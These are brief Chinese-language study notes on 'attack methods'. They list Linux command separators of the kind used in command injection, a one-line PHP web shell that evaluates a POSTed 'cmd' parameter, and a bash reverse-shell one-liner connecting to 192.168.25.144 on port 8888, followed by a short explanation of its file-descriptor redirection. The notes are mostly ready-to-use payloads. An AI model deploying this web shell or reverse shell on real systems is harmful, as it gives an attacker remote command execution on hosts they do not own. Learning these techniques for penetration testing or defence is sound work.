# 攻击方式

## Linux基础

```shell
&	都执行
;	都执行
&&	与前面成功才会执行后面
|	管道，前面输出作为后面输入
||	或，前面成功，后面不执行
```



## php攻击

```php
<?php
    eval($_POST["cmd"]);
?>
```

小马

### 反弹shell

```shell
bash -i >& /dev/tcp/192.168.25.144/8888 0>&1
```

 `>&`是对文件描述符的**拷贝**，是将0[标准输入]重定向到了1[标准输出]指向的位置，以写方式

`<&`以读方式



`>&`还会将标准错误输出合并到标准输出中
